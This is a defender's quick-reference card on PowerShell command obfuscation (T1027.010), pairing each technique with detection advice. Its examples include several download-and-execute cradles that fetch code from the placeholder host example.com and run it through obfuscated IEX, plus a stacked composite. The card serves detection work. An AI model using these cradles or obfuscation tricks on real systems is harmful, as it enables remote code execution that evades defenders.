# T1027.010 Field Card — Character Masking & Wildcard IEX

*Command Obfuscation, quick-reference card — dense by design, built to be photographed.*

Every technique below defeats a different **defender assumption**. There are only three
assumptions worth breaking, so there are only three tables. Everything downstream of them
(Sigma rules, regex, allow-lists) inherits whichever assumption it was built on.

> **Assumption 1:** "I can string/regex-match the command line."
> **Assumption 2:** "I know which cmdlet name was actually typed."
> **Assumption 3:** "The command name is *somewhere* in the script."
> Break #1 with **character masking**. Break #2 with **wildcard resolution**. Break #3
> with **character harvesting** — sourcing the characters from outside the script
> entirely. Real payloads (STEEP#MAVERICK included) stack several — see the composite
> example at the bottom.

All examples below are synthetic teaching syntax against placeholder infrastructure
(`example.com`) — safe to run in a lab, useless as a payload.

---

## Table 1 — Character Masking (breaks Assumption 1: literal string matching)

| # | Technique | Example (synthetic) | Spot it |
|---|-----------|---------------------|---------|
| 1 | **Backtick splitting** | `` I`E`X `` `(New-Object Net.WebClient).DownloadString('https://example.com/a')` | Backticks (`` ` ``) sitting *inside* a token that would otherwise spell a known cmdlet/alias if removed. Strip backticks before any string match — don't add them to your regex, subtract them from the input. |
| 2 | **Case randomization** | `InVoKe-ExPrEssIoN` `iEX` | ≥3 case flips inside one identifier. Humans don't type this; tab-completion and linters don't produce it either. Case-fold *before* matching, then flag the pre-fold entropy as a separate signal. |
| 3 | **String concat / reordering** | `('I'+'E'+'X')` · `$s='noisserpxE-ekovnI';$s[-1..-$s.Length] -join ''` | Chains of short (1–3 char) string literals joined with `+`, `-join`, `-f`, or built via array reversal/slicing, then fed straight into a call operator. The command name never appears as one literal. |
| 4 | **Unicode homoglyphs** | `New-Alias ІEX Invoke-Expression; ІEX (...)` (Cyrillic U+0406 `І`, not Latin `I`) | Requires an attacker-defined alias — native cmdlet names can't contain non-ASCII, so a look-alike name only works after registration. Script-mixing inside a *newly created* alias/variable name — Cyrillic/Greek/fullwidth code points next to ASCII. `[char]::IsAscii()` sweep or byte-level non-ASCII check on alias-creation cmdlets (`New-Alias`/`Set-Alias`) and their arguments. |
| 5 | **Char-code / format-string build** | `"$([char]73)$([char]69)$([char]88)"` · `[char[]](105,101,120)-join''` · `"{0}{1}" -f 'IE','X'` | `-f`, `-join`, or string-interpolated `[char]` casts feeding directly into `&`, `.`, or `Invoke-Expression`. (Bare `[char]73+[char]69+[char]88` does **not** concatenate — `+` between chars with no string operand adds code points. Real obfuscation always routes through interpolation/`-join`/`-f`, which is itself the detectable pattern.) |
| 5b | **Format-string *index reordering*** | `("{1}{0}" -f 'EX','I')` → `IEX` | The variant that breaks naive tooling. Reading the arguments left to right spells `EXI`; the `{1}{0}` placeholders are what rebuild `IEX`. **Any reconstruction that concatenates `-f` arguments in argument order and ignores the placeholder indices will miss this** — ours did until it was fixed. Parse the `{N}` order, then reassemble. |

## Table 2 — Wildcard Resolution (breaks Assumption 2: known cmdlet name)

*The centerpiece STEEP#MAVERICK finding — this is what T1027.010 exists to name.*

| # | Technique | Example (synthetic) | Spot it |
|---|-----------|---------------------|---------|
| 1 | **`Get-Alias` wildcard → invoke** | `&(Get-Alias i*x)((irm https://example.com/a))` | `Get-Alias` / `Get-Command` output wrapped directly in a `&` or `.` call operator, fed *fetched content* (not a bare URL — `Invoke-Expression` runs strings as code, it doesn't fetch). Grep the *whole script*, not just this line — "Invoke-Expression" and "iex" never appear anywhere in it. |
| 2 | **`Get-Command` wildcard → invoke** | `&(Get-Command *ke-*pression).Name (irm https://example.com/a)` | Wildcards on both sides of the verb-noun (`*ke-*pression`) resolving to exactly one hit, then invoked by its resolved `.Name` string. Alert on `Get-Command`/`Get-Alias` calls where the argument contains `*` **and** the result (object or resolved name) is immediately invoked. |
| 3 | **Nested wildcard resolution** | `iex (&(Get-Command ir*m) https://example.com/a)` | Two-stage indirection: the inner `&(Get-Command ir*m)` wildcard-resolves *and invokes* the downloader (`ir*m` → `irm`) to fetch stage two, then the outer `iex` executes the fetched content. Chain depth >1 is the tell — count wildcard-resolution hops, not just presence. |
| 4 | **Env-var indirection** | `&(gal i*x) $([Environment]::GetEnvironmentVariable('windir'))` | Environment variables (`${env:...}`, `[Environment]::GetEnvironmentVariable`) referenced with irregular casing or used to *build* an execution path rather than read config. |
| 5 | **Splatting to hide parameters** | `$p=@{Uri='https://example.com/a'}; irm @p` | Hash-table splat (`@p`) immediately followed by a wildcard-resolved or aliased cmdlet call — parameters never appear as plain `-Uri` text for a signature to catch. |

## Table 3 — Character Harvesting (breaks Assumption 3: the name is in the script)

*The hardest of the three to reason about, because the character source is somewhere
else entirely. Tables 1 and 2 both still require the target to be derivable from the
script's own text; this doesn't.*

| # | Technique | Example (synthetic) | Spot it |
|---|-----------|---------------------|---------|
| 1 | **Path-derived harvesting** | `.((rvpa "\???????\*2\*POO*\*river?\?6*").Path[4,15,34] -join '')` | A wildcard `Resolve-Path`/`rvpa`/`gci` produces a filesystem path, then **fixed integer offsets are indexed out of the resulting string** and joined into the command name. Nothing spells the target, no alias table is queried. Tell: an explicit index list (`[4,15,34]`) into a `.Path`/`.FullName`/`.Name` property, joined, inside a call operator. |
| 2 | **Any-string harvesting** | `$s = (Get-Date).ToString(); $s[2,7,9] -join ''` | Same shape, arbitrary string source — a date, a env var, a file's contents. The source is irrelevant; the signature is *multi-index slice → join → invoke*. Require 3+ indices on a bare slice to avoid flagging ordinary array work. |
| 3 | **Why it bypasses AMSI-era string checks** | — | AMSI sees the *resolved* buffer at invocation, so this doesn't defeat 4104 — but it defeats everything upstream that reasons about the script's literal text, including most static scanners and any rule written against cmdlet names. **This is the argument for 4104 in one line.** |

> **Detection note.** This family is why the "one heuristic" at the bottom of this card
> matters more than any individual pattern. You cannot enumerate the character sources —
> but you can match on *resolved behaviour at parse time*, where the harvest has already
> happened.

---

## Stacked (what you'll actually see in the wild)

```powershell
&(gal i`*`x)((New-Object Net.WebClient).DownloadString('hxxp://example[.]com/a'))
```
Backtick-split alias name (Table 1 #1) feeding a wildcard-resolved `Get-Alias` call
(Table 2 #1) that invokes a `.NET` download cradle. STEEP#MAVERICK stacked **eight**
layers this way — each one individually trivial, cumulatively opaque to any tool that
stops at the first decode.

## The one heuristic that beats every row above

| If you only log one thing | If you only match one thing |
|---|---|
| **4104 deobfuscated `ScriptBlockText`** — PowerShell's own engine already unwinds every layer above before execution. You are matching the *resolved* command, not the disguise. | Match on **behavior after AST parse** (wildcard args to `Get-Alias`/`Get-Command` immediately invoked; download-cradle method names; env-var-built paths) — never on the literal cmdlet name. If your rule string-matches `"Invoke-Expression"`, technique #1 in Table 2 walks straight past it. |

**Maps to:** MITRE ATT&CK **T1027.010** (Command Obfuscation), parent **T1027**
(Obfuscated Files or Information).
